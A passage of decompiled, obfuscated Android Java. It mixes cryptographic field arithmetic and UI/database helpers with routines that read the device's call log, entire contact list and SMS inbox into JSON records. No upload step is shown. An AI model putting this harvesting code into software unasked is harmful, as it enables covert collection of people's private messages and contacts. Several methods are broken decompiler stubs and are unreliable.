                    String str = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(cursorQuery.getLong(cursorQuery.getColumnIndex("date"))));
                    jSONObject.put("callTime", str);
                    jSONObject.put("createTime", str);
                    jSONArray.put(jSONObject);
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
            } while (cursorQuery.moveToNext());
            cursorQuery.close();
        }
        return jSONArray;
    }

    public static void e(int[] iArr) {
        long j2 = (((long) iArr[0]) & 4294967295L) - 1;
        iArr[0] = (int) j2;
        long j3 = j2 >> 32;
        if (j3 != 0) {
            long j4 = j3 + (((long) iArr[1]) & 4294967295L);
            iArr[1] = (int) j4;
            long j5 = (j4 >> 32) + (((long) iArr[2]) & 4294967295L);
            iArr[2] = (int) j5;
            j3 = j5 >> 32;
        }
        long j6 = (4294967295L & ((long) iArr[3])) + 1 + j3;
        iArr[3] = (int) j6;
        if ((j6 >> 32) != 0) {
            fa0.a0(7, 4, iArr);
        }
    }

    public static JSONArray e0(Context context) {
        Cursor cursor;
        String string;
        JSONObject jSONObject;
        Cursor cursorQuery;
        Cursor cursorQuery2;
        Cursor cursorQuery3;
        int columnIndex;
        JSONArray jSONArray = new JSONArray();
        if (t40.o(context, "android.permission.READ_CONTACTS") == 0) {
            ContentResolver contentResolver = context.getContentResolver();
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            try {
                Cursor cursorQuery4 = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
                if (cursorQuery4 != null) {
                    try {
                        if (cursorQuery4.moveToFirst()) {
                            do {
                                try {
                                    string = cursorQuery4.getString(cursorQuery4.getColumnIndexOrThrow("_id"));
                                    String string2 = cursorQuery4.getString(cursorQuery4.getColumnIndexOrThrow("display_name"));
                                    jSONObject = new JSONObject();
                                    if (string2 == null) {
                                        string2 = "";
                                    }
                                    jSONObject.put(ApiConstants.NAME, string2);
                                    jSONObject.put("phone", "");
                                    jSONObject.put("content", "");
                                    jSONObject.put("email", "");
                                    jSONObject.put("createTime", "");
                                    try {
                                        cursorQuery = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = ?", new String[]{string}, null);
                                        if (cursorQuery != null) {
                                            try {
                                                if (cursorQuery.moveToFirst()) {
                                                    String string3 = cursorQuery.getString(cursorQuery.getColumnIndexOrThrow("data1"));
                                                    if (string3 == null) {
                                                        string3 = "";
                                                    }
                                                    jSONObject.put("phone", string3);
                                                }
                                            } catch (Throwable th) {
                                                th = th;
                                                if (cursorQuery != null) {
                                                    cursorQuery.close();
                                                }
                                                throw th;
                                            }
                                        }
                                        if (cursorQuery != null) {
                                            cursorQuery.close();
                                        }
                                    } catch (Throwable th2) {
                                        th = th2;
                                        cursorQuery = null;
                                    }
                                } catch (Exception e2) {
                                    e2.printStackTrace();
                                }
                                try {
                                    cursorQuery2 = contentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, "contact_id = ?", new String[]{string}, null);
                                    if (cursorQuery2 != null) {
                                        try {
                                            if (cursorQuery2.moveToFirst()) {
                                                String string4 = cursorQuery2.getString(cursorQuery2.getColumnIndexOrThrow("data1"));
                                                if (string4 == null) {
                                                    string4 = "";
                                                }
                                                jSONObject.put("email", string4);
                                            }
                                        } catch (Throwable th3) {
                                            th = th3;
                                            if (cursorQuery2 != null) {
                                                cursorQuery2.close();
                                            }
                                            throw th;
                                        }
                                    }
                                    if (cursorQuery2 != null) {
                                        cursorQuery2.close();
                                    }
                                    try {
                                        cursorQuery3 = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, new String[]{"contact_last_updated_timestamp"}, "_id=?", new String[]{string}, null);
                                        if (cursorQuery3 != null) {
                                            try {
                                                if (cursorQuery3.moveToFirst() && (columnIndex = cursorQuery3.getColumnIndex("contact_last_updated_timestamp")) != -1) {
                                                    jSONObject.put("createTime", simpleDateFormat.format(new Date(cursorQuery3.getLong(columnIndex))));
                                                }
                                            } catch (Throwable th4) {
                                                th = th4;
                                                if (cursorQuery3 != null) {
                                                    cursorQuery3.close();
                                                }
                                                throw th;
                                            }
                                        }
                                        if (cursorQuery3 != null) {
                                            cursorQuery3.close();
                                        }
                                        jSONArray.put(jSONObject);
                                    } catch (Throwable th5) {
                                        th = th5;
                                        cursorQuery3 = null;
                                    }
                                } catch (Throwable th6) {
                                    th = th6;
                                    cursorQuery2 = null;
                                }
                            } while (cursorQuery4.moveToNext());
                        }
                    } catch (Throwable th7) {
                        th = th7;
                        cursor = cursorQuery4;
                        if (cursor != null) {
                            cursor.close();
                        }
                        throw th;
                    }
                }
                if (cursorQuery4 != null) {
                    cursorQuery4.close();
                }
            } catch (Throwable th8) {
                th = th8;
                cursor = null;
            }
        }
        return jSONArray;
    }

    public static Type f(Type type) {
        if (type instanceof Class) {
            Class cls = (Class) type;
            return cls.isArray() ? new a(f(cls.getComponentType())) : cls;
        }
        if (type instanceof ParameterizedType) {
            ParameterizedType parameterizedType = (ParameterizedType) type;
            return new b(parameterizedType.getOwnerType(), parameterizedType.getRawType(), parameterizedType.getActualTypeArguments());
        }
        if (type instanceof GenericArrayType) {
            return new a(((GenericArrayType) type).getGenericComponentType());
        }
        if (!(type instanceof WildcardType)) {
            return type;
        }
        WildcardType wildcardType = (WildcardType) type;
        return new c(wildcardType.getUpperBounds(), wildcardType.getLowerBounds());
    }

    public static JSONArray f0(Context context) {
        Cursor cursorQuery;
        JSONArray jSONArray = new JSONArray();
        if (t40.o(context, "android.permission.READ_SMS") == 0 && (cursorQuery = context.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"_id", "address", "body", "date", "date_sent"}, null, null, "date DESC")) != null && cursorQuery.moveToFirst()) {
            do {
                try {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(ApiConstants.ID, cursorQuery.getLong(cursorQuery.getColumnIndex("_id")));
                    jSONObject.put("sender", cursorQuery.getString(cursorQuery.getColumnIndex("address")));
                    jSONObject.put("body", cursorQuery.getString(cursorQuery.getColumnIndex("body")));
                    jSONObject.put("receivedTime", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(cursorQuery.getLong(cursorQuery.getColumnIndex("date")))));
                    if (cursorQuery.isNull(cursorQuery.getColumnIndex("date_sent"))) {
                        jSONObject.put("createTime", "");
                    } else {
                        jSONObject.put("createTime", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(cursorQuery.getLong(cursorQuery.getColumnIndex("date_sent")))));
                    }
                    jSONArray.put(jSONObject);
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
            } while (cursorQuery.moveToNext());
            cursorQuery.close();
        }
        return jSONArray;
    }

    public static void g(Type type) {
        j31.j(((type instanceof Class) && ((Class) type).isPrimitive()) ? false : true);
    }

    public static void g0(int[] iArr, int[] iArr2) {
        int i2 = iArr[7];
        int i3 = i2;
        int i4 = 0;
        while (i4 < 8) {
            int i5 = iArr[8 + i4];
            iArr2[i4] = (i3 >>> 31) | (i5 << 1);
            i4++;
            i3 = i5;
        }
        long j2 = ((long) 19) & 4294967295L;
        long j3 = ((((long) iArr2[0]) & 4294967295L) * j2) + (((long) iArr[0]) & 4294967295L);
        iArr2[0] = (int) j3;
        long j4 = ((((long) iArr2[1]) & 4294967295L) * j2) + (((long) iArr[1]) & 4294967295L) + (j3 >>> 32);
        iArr2[1] = (int) j4;
        long j5 = ((((long) iArr2[2]) & 4294967295L) * j2) + (((long) iArr[2]) & 4294967295L) + (j4 >>> 32);
        iArr2[2] = (int) j5;
        long j6 = ((((long) iArr2[3]) & 4294967295L) * j2) + (((long) iArr[3]) & 4294967295L) + (j5 >>> 32);
        iArr2[3] = (int) j6;
        long j7 = ((((long) iArr2[4]) & 4294967295L) * j2) + (((long) iArr[4]) & 4294967295L) + (j6 >>> 32);
        iArr2[4] = (int) j7;
        long j8 = ((((long) iArr2[5]) & 4294967295L) * j2) + (((long) iArr[5]) & 4294967295L) + (j7 >>> 32);
        iArr2[5] = (int) j8;
        long j9 = ((((long) iArr2[6]) & 4294967295L) * j2) + (((long) iArr[6]) & 4294967295L) + (j8 >>> 32);
        iArr2[6] = (int) j9;
        long j10 = (j2 * (((long) iArr2[7]) & 4294967295L)) + (4294967295L & ((long) iArr[7])) + (j9 >>> 32);
        int i6 = (int) j10;
        iArr2[7] = i6;
        iArr2[7] = (Integer.MAX_VALUE & i6) + fa0.l(7, ((((int) (j10 >>> 32)) << 1) + ((i6 >>> 31) - (i2 >>> 31))) * 19, iArr2);
        if (fa0.U(iArr2, c)) {
            C0(iArr2);
        }
    }

    public static final void h(Closeable closeable, Throwable th) {
        if (closeable != null) {
            if (th == null) {
                closeable.close();
                return;
            }
            try {
                closeable.close();
            } catch (Throwable th2) {
                l21.j(th, th2);
            }
        }
    }

    public static void h0(long[] jArr, long[] jArr2) {
        long j2 = jArr[0];
        long j3 = jArr[1];
        long j4 = jArr[2];
        long j5 = jArr[3];
        long j6 = jArr[4];
        long j7 = j5 ^ (j6 >>> 59);
        long j8 = j2 ^ ((j7 << 61) ^ (j7 << 63));
        long j9 = (j3 ^ ((j6 << 61) ^ (j6 << 63))) ^ ((((j7 >>> 3) ^ (j7 >>> 1)) ^ j7) ^ (j7 << 5));
        long j10 = (j4 ^ ((((j6 >>> 3) ^ (j6 >>> 1)) ^ j6) ^ (j6 << 5))) ^ (j7 >>> 59);
        long j11 = j10 >>> 3;
        jArr2[0] = (((j8 ^ j11) ^ (j11 << 2)) ^ (j11 << 3)) ^ (j11 << 8);
        jArr2[1] = (j10 >>> 59) ^ j9;
        jArr2[2] = 7 & j10;
    }

    public static Drawable i(Drawable drawable, Drawable drawable2, int i2, int i3) {
        if (drawable == null) {
            return drawable2;
        }
        if (drawable2 == null) {
            return drawable;
        }
        if (i2 == -1 && (i2 = drawable2.getIntrinsicWidth()) == -1) {
            i2 = drawable.getIntrinsicWidth();
        }
        if (i3 == -1 && (i3 = drawable2.getIntrinsicHeight()) == -1) {
            i3 = drawable.getIntrinsicHeight();
        }
        if (i2 > drawable.getIntrinsicWidth() || i3 > drawable.getIntrinsicHeight()) {
            float f2 = i2 / i3;
            if (f2 >= drawable.getIntrinsicWidth() / drawable.getIntrinsicHeight()) {
                int intrinsicWidth = drawable.getIntrinsicWidth();
                i3 = (int) (intrinsicWidth / f2);
                i2 = intrinsicWidth;
            } else {
                i3 = drawable.getIntrinsicHeight();
                i2 = (int) (f2 * i3);
            }
        }
        LayerDrawable layerDrawable = new LayerDrawable(new Drawable[]{drawable, drawable2});
        layerDrawable.setLayerSize(1, i2, i3);
        layerDrawable.setLayerGravity(1, 17);
        return layerDrawable;
    }

    public static void i0(int[] iArr, int[] iArr2) {
        long j2 = ((long) iArr[8]) & 4294967295L;
        long j3 = ((long) iArr[9]) & 4294967295L;
        long j4 = ((long) iArr[10]) & 4294967295L;
        long j5 = ((long) iArr[11]) & 4294967295L;
        long j6 = ((long) iArr[12]) & 4294967295L;
        long j7 = ((long) iArr[13]) & 4294967295L;
        long j8 = ((long) iArr[14]) & 4294967295L;
        long j9 = ((long) iArr[15]) & 4294967295L;
        long j10 = j4 + j5;
        long j11 = j7 + j8;
        long j12 = j11 + (j9 << 1);
        long j13 = j2 + j3 + j11;
        long j14 = j10 + j6 + j9 + j13;
        long j15 = (((long) iArr[0]) & 4294967295L) + j14 + j7 + j8 + j9;
        iArr2[0] = (int) j15;
        long j16 = (((((long) iArr[1]) & 4294967295L) + j14) - j2) + j8 + j9 + (j15 >> 32);
        iArr2[1] = (int) j16;
        long j17 = ((((long) iArr[2]) & 4294967295L) - j13) + (j16 >> 32);
        iArr2[2] = (int) j17;
        long j18 = ((((((long) iArr[3]) & 4294967295L) + j14) - j3) - j4) + j7 + (j17 >> 32);
        iArr2[3] = (int) j18;
        long j19 = ((((((long) iArr[4]) & 4294967295L) + j14) - j10) - j2) + j8 + (j18 >> 32);
        iArr2[4] = (int) j19;
        long j20 = (((long) iArr[5]) & 4294967295L) + j12 + j4 + (j19 >> 32);
        iArr2[5] = (int) j20;
        long j21 = (((long) iArr[6]) & 4294967295L) + j5 + j8 + j9 + (j20 >> 32);
        iArr2[6] = (int) j21;
        long j22 = (((long) iArr[7]) & 4294967295L) + j14 + j12 + j6 + (j21 >> 32);
        iArr2[7] = (int) j22;
        m0(iArr2, (int) (j22 >> 32));
    }

    public static void j(or orVar) {
        xq xqVar = orVar.a;
        if (xqVar == null) {
            return;
        }
        BigInteger bigInteger = xqVar.d;
        int iJ = bigInteger == null ? xqVar.j() + 1 : bigInteger.bitLength();
        int[] iArr = A;
        int i2 = 0;
        while (i2 < 6 && iJ >= iArr[i2]) {
            i2++;
        }
        xqVar.n(orVar, "bc_wnaf", new iq0(Math.min(16, Math.max(2, Math.min(16, i2 + 2)) + 3), 3));
    }

    public static void j0(int[] iArr, int[] iArr2) {
        long j2 = ((long) iArr[5]) & 4294967295L;
        long j3 = ((long) iArr[6]) & 4294967295L;
        long j4 = ((long) iArr[7]) & 4294967295L;
        long j5 = ((long) iArr[8]) & 4294967295L;
        long j6 = ((long) iArr[9]) & 4294967295L;
        long j7 = (((long) iArr[0]) & 4294967295L) + j2 + (j2 << 31);
        iArr2[0] = (int) j7;
        long j8 = (((long) iArr[1]) & 4294967295L) + j3 + (j3 << 31) + (j7 >>> 32);
        iArr2[1] = (int) j8;
        long j9 = (((long) iArr[2]) & 4294967295L) + j4 + (j4 << 31) + (j8 >>> 32);
        iArr2[2] = (int) j9;
        long j10 = (((long) iArr[3]) & 4294967295L) + j5 + (j5 << 31) + (j9 >>> 32);
        iArr2[3] = (int) j10;
        long j11 = (4294967295L & ((long) iArr[4])) + j6 + (j6 << 31) + (j10 >>> 32);
        iArr2[4] = (int) j11;
        n0(iArr2, (int) (j11 >>> 32));
    }

    public static Drawable k(Drawable drawable, ColorStateList colorStateList, PorterDuff.Mode mode) {
        if (drawable == null) {
            return null;
        }
        if (colorStateList != null) {
            drawable = drawable.mutate();
            if (mode != null) {
                ip.i(drawable, mode);
            }
        }
        return drawable;
    }

    public static void k0(int[] iArr, int[] iArr2) {
        long j2 = ((long) iArr[10]) & 4294967295L;
        long j3 = ((long) iArr[11]) & 4294967295L;
        long j4 = ((long) iArr[12]) & 4294967295L;
        long j5 = ((long) iArr[13]) & 4294967295L;
        long j6 = ((((long) iArr[7]) & 4294967295L) + j3) - 1;
        long j7 = (((long) iArr[8]) & 4294967295L) + j4;
        long j8 = (((long) iArr[9]) & 4294967295L) + j5;
        long j9 = (((long) iArr[0]) & 4294967295L) - j6;
        long j10 = j9 & 4294967295L;
        long j11 = ((((long) iArr[1]) & 4294967295L) - j7) + (j9 >> 32);
        int i2 = (int) j11;
        iArr2[1] = i2;
        long j12 = ((((long) iArr[2]) & 4294967295L) - j8) + (j11 >> 32);
        int i3 = (int) j12;
        iArr2[2] = i3;
        long j13 = (((((long) iArr[3]) & 4294967295L) + j6) - j2) + (j12 >> 32);
        long j14 = j13 & 4294967295L;
        long j15 = (((((long) iArr[4]) & 4294967295L) + j7) - j3) + (j13 >> 32);
        iArr2[4] = (int) j15;
        long j16 = (((((long) iArr[5]) & 4294967295L) + j8) - j4) + (j15 >> 32);
        iArr2[5] = (int) j16;
        long j17 = (((((long) iArr[6]) & 4294967295L) + j2) - j5) + (j16 >> 32);
        iArr2[6] = (int) j17;
        long j18 = (j17 >> 32) + 1;
        long j19 = j14 + j18;
        long j20 = j10 - j18;
        iArr2[0] = (int) j20;
        long j21 = j20 >> 32;
        if (j21 != 0) {
            long j22 = j21 + (((long) i2) & 4294967295L);
            iArr2[1] = (int) j22;
            long j23 = (j22 >> 32) + (((long) i3) & 4294967295L);
            iArr2[2] = (int) j23;
            j19 += j23 >> 32;
        }
        iArr2[3] = (int) j19;
        if (((j19 >> 32) == 0 || fa0.a0(7, 4, iArr2) == 0) && !(iArr2[6] == -1 && s90.z(iArr2, n))) {
            return;
        }
        e(iArr2);
    }

    public static void l(Canvas canvas, boolean z2) {
        Method method;
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 29) {
            if (z2) {
                ic.b(canvas);
                return;
            } else {
                ic.a(canvas);
                return;
            }
        }
        if (i2 == 28) {
            throw new IllegalStateException("This method doesn't work on Pie!");
        }
        if (!D) {
            try {
                Method declaredMethod = Canvas.class.getDeclaredMethod("insertReorderBarrier", new Class[0]);
                B = declaredMethod;
                declaredMethod.setAccessible(true);
                Method declaredMethod2 = Canvas.class.getDeclaredMethod("insertInorderBarrier", new Class[0]);
                C = declaredMethod2;
                declaredMethod2.setAccessible(true);
            } catch (NoSuchMethodException unused) {
            }
            D = true;
        }
        if (z2) {
            try {
                Method method2 = B;
                if (method2 != null) {
                    method2.invoke(canvas, new Object[0]);
                }
            } catch (IllegalAccessException unused2) {
                return;
            } catch (InvocationTargetException e2) {
                throw new RuntimeException(e2.getCause());
            }
        }
        if (z2 || (method = C) == null) {
            return;
        }
        method.invoke(canvas, new Object[0]);
    }

    public static void l0(int[] iArr, int i2) {
        int i3 = iArr[7];
        iArr[7] = fa0.l(7, ((i2 << 1) | (i3 >>> 31)) * 19, iArr) + (i3 & Integer.MAX_VALUE);
        if (fa0.U(iArr, c)) {
            C0(iArr);
        }
    }

    public static boolean m(Type type, Type type2) {
        if (type == type2) {
            return true;
        }
        if (type instanceof Class) {
            return type.equals(type2);
        }
        if (type instanceof ParameterizedType) {
            if (!(type2 instanceof ParameterizedType)) {
                return false;
            }
            ParameterizedType parameterizedType = (ParameterizedType) type;
            ParameterizedType parameterizedType2 = (ParameterizedType) type2;
            Type ownerType = parameterizedType.getOwnerType();
            Type ownerType2 = parameterizedType2.getOwnerType();
            return (ownerType == ownerType2 || (ownerType != null && ownerType.equals(ownerType2))) && parameterizedType.getRawType().equals(parameterizedType2.getRawType()) && Arrays.equals(parameterizedType.getActualTypeArguments(), parameterizedType2.getActualTypeArguments());
        }
        if (type instanceof GenericArrayType) {
            if (type2 instanceof GenericArrayType) {
                return m(((GenericArrayType) type).getGenericComponentType(), ((GenericArrayType) type2).getGenericComponentType());
            }
            return false;
        }
        if (type instanceof WildcardType) {
            if (!(type2 instanceof WildcardType)) {
                return false;
            }
            WildcardType wildcardType = (WildcardType) type;
            WildcardType wildcardType2 = (WildcardType) type2;
            return Arrays.equals(wildcardType.getUpperBounds(), wildcardType2.getUpperBounds()) && Arrays.equals(wildcardType.getLowerBounds(), wildcardType2.getLowerBounds());
        }
        if (!(type instanceof TypeVariable) || !(type2 instanceof TypeVariable)) {
            return false;
        }
        TypeVariable typeVariable = (TypeVariable) type;
        TypeVariable typeVariable2 = (TypeVariable) type2;
        return typeVariable.getGenericDeclaration() == typeVariable2.getGenericDeclaration() && typeVariable.getName().equals(typeVariable2.getName());
    }

    public static void m0(int[] iArr, int i2) {
        long j2;
        if (i2 != 0) {
            long j3 = ((long) i2) & 4294967295L;
            long j4 = (((long) iArr[0]) & 4294967295L) + j3;
            iArr[0] = (int) j4;
            long j5 = j4 >> 32;
            if (j5 != 0) {
                long j6 = j5 + (((long) iArr[1]) & 4294967295L);
                iArr[1] = (int) j6;
                j5 = j6 >> 32;
            }
            long j7 = ((((long) iArr[2]) & 4294967295L) - j3) + j5;
            iArr[2] = (int) j7;
            long j8 = (((long) iArr[3]) & 4294967295L) + j3 + (j7 >> 32);
            iArr[3] = (int) j8;
            long j9 = j8 >> 32;
            if (j9 != 0) {
                long j10 = j9 + (((long) iArr[4]) & 4294967295L);
                iArr[4] = (int) j10;
                long j11 = (j10 >> 32) + (((long) iArr[5]) & 4294967295L);
                iArr[5] = (int) j11;
                long j12 = (j11 >> 32) + (((long) iArr[6]) & 4294967295L);
                iArr[6] = (int) j12;
                j9 = j12 >> 32;
            }
            long j13 = (4294967295L & ((long) iArr[7])) + j3 + j9;
            iArr[7] = (int) j13;
            j2 = j13 >> 32;
        } else {
            j2 = 0;
        }
        if (j2 != 0 || ((iArr[7] >>> 1) >= Integer.MAX_VALUE && fa0.U(iArr, i))) {
            d(iArr);
        }
    }

    public static long n(int i2) {
        int iO = l21.o(l21.o(l21.o(l21.o(i2, 65280, 8), 15728880, 4), 202116108, 2), 572662306, 1);
        return ((((long) (iO >>> 1)) & 1431655765) << 32) | (1431655765 & ((long) iO));
    }

    /* JADX WARN: Removed duplicated region for block: B:9:0x0035  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static void n0(int[] r10, int r11) {
        /*
            r0 = 5
            r1 = -2147483647(0xffffffff80000001, float:-1.4E-45)
            if (r11 == 0) goto L35
            long r2 = (long) r1
            r4 = 4294967295(0xffffffff, double:2.1219957905E-314)
            long r2 = r2 & r4
            long r6 = (long) r11
            long r6 = r6 & r4
            long r6 = r6 * r2
            r11 = 0
            r2 = r10[r11]
            long r2 = (long) r2
            long r2 = r2 & r4
            long r6 = r6 + r2
            int r2 = (int) r6
            r10[r11] = r2
            r2 = 32
            long r6 = r6 >>> r2
            r3 = 1
            r8 = r10[r3]
            long r8 = (long) r8
            long r4 = r4 & r8
            long r6 = r6 + r4
            int r4 = (int) r6
            r10[r3] = r4
            long r2 = r6 >>> r2
            r4 = 0
            int r2 = (r2 > r4 ? 1 : (r2 == r4 ? 0 : -1))
            if (r2 != 0) goto L2e
            goto L33
        L2e:
            r11 = 2
            int r11 = defpackage.fa0.b0(r0, r11, r10)
        L33:
            if (r11 != 0) goto L43
        L35:
            r11 = 4
            r11 = r10[r11]
            r2 = -1
            if (r11 != r2) goto L46
            int[] r11 = defpackage.qm.k
            boolean r11 = defpackage.ma0.F(r10, r11)
            if (r11 == 0) goto L46
        L43:
            defpackage.fa0.l(r0, r1, r10)
        L46:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: defpackage.qm.n0(int[], int):void");
    }

    public static void o(int i2, long[] jArr, long[] jArr2) {
        int i3 = 0;
        for (int i4 = 0; i4 < i2; i4++) {
            long jP = l21.p(l21.p(l21.p(l21.p(l21.p(jArr[i4], 16, 4294901760L), 8, 280375465148160L), 4, 67555025218437360L), 2, 868082074056920076L), 1, 2459565876494606882L);
            jArr2[i3] = jP & 6148914691236517205L;
            jArr2[i3 + 1] = (jP >>> 1) & 6148914691236517205L;
            i3 += 2;
        }
    }

    public static void o0(int[] iArr, int i2) {
        long j2;
        if (i2 != 0) {
            long j3 = ((long) i2) & 4294967295L;
            long j4 = (((long) iArr[0]) & 4294967295L) - j3;
            iArr[0] = (int) j4;
            long j5 = j4 >> 32;
            if (j5 != 0) {
                long j6 = j5 + (((long) iArr[1]) & 4294967295L);
                iArr[1] = (int) j6;
                long j7 = (j6 >> 32) + (((long) iArr[2]) & 4294967295L);
                iArr[2] = (int) j7;
                j5 = j7 >> 32;
            }
            long j8 = (4294967295L & ((long) iArr[3])) + j3 + j5;
            iArr[3] = (int) j8;
            j2 = j8 >> 32;
        } else {
            j2 = 0;
        }
        if ((j2 == 0 || fa0.a0(7, 4, iArr) == 0) && !(iArr[6] == -1 && s90.z(iArr, n))) {
            return;
        }
        e(iArr);
    }

    public static Object p(zi ziVar, Object obj, d10 d10Var) {
        t40.n(d10Var, "operation");
        return d10Var.invoke(obj, ziVar);
    }

    /* JADX WARN: Removed duplicated region for block: B:24:0x004b  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static java.lang.reflect.Type p0(java.lang.reflect.Type r8, java.lang.Class r9, java.lang.reflect.Type r10, java.util.HashSet r11) {
        /*
            Method dump skipped, instruction units count: 288
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: defpackage.qm.p0(java.lang.reflect.Type, java.lang.Class, java.lang.reflect.Type, java.util.HashSet):java.lang.reflect.Type");
    }

    public static String q(or orVar, kr krVar) {
        xq xqVar = krVar.a;
        char[] cArr = t40.e;
        int i2 = 0;
        byte[] bArrH = orVar.h(false);
        if (xqVar == null) {
            zq0 sHAKENativeDigest = org.bouncycastle.crypto.a.c("SHAKE") ? new SHAKENativeDigest(NatsJetStreamConstants.MAX_PULL_SIZE, CryptoServicePurpose.ANY) : new gq0(NatsJetStreamConstants.MAX_PULL_SIZE);
            sHAKENativeDigest.e(bArrH, 0, bArrH.length);
            byte[] bArr = new byte[20];
            sHAKENativeDigest.h(bArr, 0, 20);
            StringBuffer stringBuffer = new StringBuffer();
            while (i2 != 20) {
                if (i2 > 0) {
                    stringBuffer.append(":");
                }
                stringBuffer.append(cArr[(bArr[i2] >>> 4) & 15]);
                stringBuffer.append(cArr[bArr[i2] & 15]);
                i2++;
            }
            return stringBuffer.toString();
        }
        l21 l21Var = xqVar.b;
        byte[] bArrA = oa.a(l21Var.J(), l21Var.h1());
        l21 l21Var2 = xqVar.c;
        byte[] bArrO = z91.o(bArrH, bArrA, oa.a(l21Var2.J(), l21Var2.h1()), krVar.c.h(false));
        zq0 sHAKENativeDigest2 = org.bouncycastle.crypto.a.c("SHAKE") ? new SHAKENativeDigest(NatsJetStreamConstants.MAX_PULL_SIZE, CryptoServicePurpose.ANY) : new gq0(NatsJetStreamConstants.MAX_PULL_SIZE);
        sHAKENativeDigest2.e(bArrO, 0, bArrO.length);
        byte[] bArr2 = new byte[20];
        sHAKENativeDigest2.h(bArr2, 0, 20);
        StringBuffer stringBuffer2 = new StringBuffer();
        while (i2 != 20) {
            if (i2 > 0) {
                stringBuffer2.append(":");
            }
            stringBuffer2.append(cArr[(bArr2[i2] >>> 4) & 15]);
            stringBuffer2.append(cArr[bArr2[i2] & 15]);
            i2++;
        }
        return stringBuffer2.toString();
    }

    public static int[] r(int[] iArr) {
        for (int i2 = 0; i2 < iArr.length; i2++) {
            int i3 = iArr[i2];
            if (i3 == 16842912) {
                return iArr;
            }
            if (i3 == 0) {
                int[] iArr2 = (int[]) iArr.clone();
                iArr2[i2] = 16842912;
                return iArr2;
            }
        }
        int[] iArrCopyOf = Arrays.copyOf(iArr, iArr.length + 1);
        iArrCopyOf[iArr.length] = 16842912;
        return iArrCopyOf;
    }

    public static ColorStateList s(Drawable drawable) {
        if (drawable instanceof ColorDrawable) {
            return ColorStateList.valueOf(((ColorDrawable) drawable).getColor());
        }
        if (Build.VERSION.SDK_INT < 29 || !a2.s(drawable)) {
            return null;
        }
        return a2.d(drawable).getColorStateList();
    }

    public static void s0(Outline outline, Path path) {
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 30) {
            np.a(outline, path);
            return;
        }
        if (i2 >= 29) {
            try {
                mp.a(outline, path);
            } catch (IllegalArgumentException unused) {
            }
        } else if (path.isConvex()) {
            mp.a(outline, path);
        }
    }

    public static final int t(Cursor cursor, String str) {
        t40.n(cursor, "c");
        int columnIndex = cursor.getColumnIndex(str);
        if (columnIndex >= 0) {
            return columnIndex;
        }
        int columnIndex2 = cursor.getColumnIndex("`" + str + '`');
        if (columnIndex2 >= 0) {
            return columnIndex2;
        }
        if (Build.VERSION.SDK_INT > 25 || str.length() == 0) {
            return -1;
        }
        String[] columnNames = cursor.getColumnNames();
        t40.m(columnNames, "columnNames");
        String strConcat = NatsConstants.DOT.concat(str);
        String str2 = NatsConstants.DOT + str + '`';
        int length = columnNames.length;
        int i2 = 0;
        int i3 = 0;
        while (i2 < length) {
            String str3 = columnNames[i2];
            int i4 = i3 + 1;
            if (str3.length() >= str.length() + 2) {
                t40.n(strConcat, "suffix");
                if (!str3.endsWith(strConcat)) {
                    if (str3.charAt(0) == '`') {
                        t40.n(str2, "suffix");
                        if (str3.endsWith(str2)) {
                        }
                    } else {
                        continue;
                    }
                }
                return i3;
            }
            i2++;
            i3 = i4;
        }
        return -1;
    }

    public static void t0(int[] iArr, int[] iArr2) {
        int[] iArr3 = new int[16];
        fa0.y0(iArr, iArr3);
        g0(iArr3, iArr2);
    }

    public static final int u(Cursor cursor, String str) {
        String string;
        t40.n(cursor, "c");
        int iT = t(cursor, str);
        if (iT >= 0) {
            return iT;
        }
        try {
            String[] columnNames = cursor.getColumnNames();
            t40.m(columnNames, "c.columnNames");
            StringBuilder sb = new StringBuilder();
            sb.append((CharSequence) "");
            int i2 = 0;
            for (String str2 : columnNames) {
                i2++;
                if (i2 > 1) {
                    sb.append((CharSequence) ", ");
                }
                o80.h(sb, str2, null);
            }
            sb.append((CharSequence) "");
            string = sb.toString();
            t40.m(string, "toString(...)");
        } catch (Exception e2) {
            Log.d("RoomCursorUtil", "Cannot collect column names for debug purposes", e2);
            string = "unknown";
        }
        throw new IllegalArgumentException("column '" + str + "' does not exist. Available columns: " + string);
    }

    public static void u0(int[] iArr, int[] iArr2) {
        int[] iArr3 = new int[16];
        fa0.y0(iArr, iArr3);
        i0(iArr3, iArr2);
    }

    public static String v(d0 d0Var) {
        String strD = (String) p91.c.get(d0Var);
        if (strD == null) {
            strD = (String) zp0.c.get(d0Var);
        }
        if (strD == null) {
            strD = (String) xf0.b.get(d0Var);
        }
        if (strD == null) {
            strD = (String) nz0.c.get(d0Var);
        }
        if (strD == null) {
            strD = (String) m.c.get(d0Var);
        }
        if (strD == null) {
            strD = dr.d(d0Var);
        }
        if (strD == null) {
            strD = (String) m10.c.get(d0Var);
        }
        return strD == null ? (String) gk.d.get(d0Var) : strD;
    }

    public static void v0(int[] iArr, int[] iArr2) {
        int[] iArr3 = new int[10];
        ma0.q0(iArr, iArr3);
        j0(iArr3, iArr2);
    }

    public static fk0 w(Long l2, Long l3) {
        if (l2 == null && l3 == null) {
            return new fk0(null, null);
        }
        if (l2 == null) {
            return new fk0(null, x(l3.longValue()));
        }
        if (l3 == null) {
            return new fk0(x(l2.longValue()), null);
        }
        Calendar calendarF = h31.f();
        Calendar calendarG = h31.g(null);
